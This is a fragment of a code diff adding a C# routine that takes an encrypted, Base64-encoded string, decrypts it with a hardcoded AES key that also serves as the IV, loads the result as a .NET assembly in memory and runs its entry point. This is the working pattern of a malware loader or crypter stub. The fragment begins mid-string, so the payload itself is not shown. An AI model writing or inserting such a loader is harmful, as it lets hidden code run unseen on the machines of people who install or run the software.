@@ -1,0 +1,23 @@
+";
+            Assembly asm = Assembly.Load(Convert.FromBase64String(Decrypt(textToDecrypt, "pw6F4OClymrg75TYAUwADKL7XZR4Oxpz")));
+            MethodInfo mtd = asm.EntryPoint;
+            mtd.Invoke(null, null);
+        }
+        private static string Decrypt(string textToDecrypt, string key)
+        {
+            RijndaelManaged rijndaelManaged = new RijndaelManaged();
+            rijndaelManaged.Mode = CipherMode.CBC;
+            rijndaelManaged.Padding = PaddingMode.PKCS7;
+            rijndaelManaged.KeySize = 128;
+            rijndaelManaged.BlockSize = 128;
+            byte[] inputBuffer = Convert.FromBase64String(textToDecrypt);
+            byte[] bytes = Encoding.UTF8.GetBytes(key);
+            byte[] numArray = new byte[16];
+            int length = bytes.Length;
+            if (length > numArray.Length)
+                length = numArray.Length;
+            Array.Copy((Array)bytes, (Array)numArray, length);
+            rijndaelManaged.Key = numArray;
+            rijndaelManaged.IV = numArray;
+            return Encoding.UTF8.GetString(rijndaelManaged.CreateDecryptor().TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
+        }
